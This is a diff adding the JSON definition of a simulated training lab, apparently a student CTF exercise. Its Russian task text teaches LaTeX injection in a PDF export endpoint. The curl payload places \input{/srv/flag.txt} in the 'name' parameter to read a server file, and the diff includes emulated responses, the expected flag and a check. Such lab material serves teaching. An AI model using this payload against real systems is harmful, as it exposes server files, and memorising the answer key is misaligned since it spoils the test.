@@ -1,0 +1,39 @@
+{
+  "id": "web-latex-csv-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{l4t3x_1nput_f1l3_r34d}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: инъекция через экспорт PDF\n\n`report.local` делает PDF-отчёт и подставляет параметр `name` в LaTeX-шаблон.\n\n1. Посмотри на обычный ответ:\n\n   curl -s 'http://report.local/export?format=pdf&name=Alice'\n\n2. Параметр `name` попадает в шаблон без экранирования. LaTeX читает файлы\n   директивой \\input{путь}. Попробуй прочитать серверный файл:\n\n   curl -s 'http://report.local/export?format=pdf&name=\\input{/srv/flag.txt}'\n\n3. Сохрани ответ в found.txt:\n\n   curl -s 'http://report.local/export?format=pdf&name=\\input{/srv/flag.txt}' > found.txt\n\n4. Набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция report.local: /export)",
+      "cases": [
+        {
+          "match": "input",
+          "example": "-s 'http://report.local/export?format=pdf&name=\\input{/srv/flag.txt}'",
+          "output": "%PDF-1.4\n% report.local latex export\n1 0 obj << /Type /Catalog >> endobj\nstream\nОтчёт для: \nnto{l4t3x_1nput_f1l3_r34d}\nendstream\n%%EOF\n"
+        },
+        {
+          "match": "format=csv",
+          "example": "-s 'http://report.local/export?format=csv&name=Alice'",
+          "output": "name,amount\nAlice,100\n"
+        },
+        {
+          "match": "export\\?format=pdf|export",
+          "example": "-s 'http://report.local/export?format=pdf&name=Alice'",
+          "output": "%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\nstream\nОтчёт для: Alice\nendstream\n%%EOF\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется report.local (/export).\n"
+    }
+  }
+}
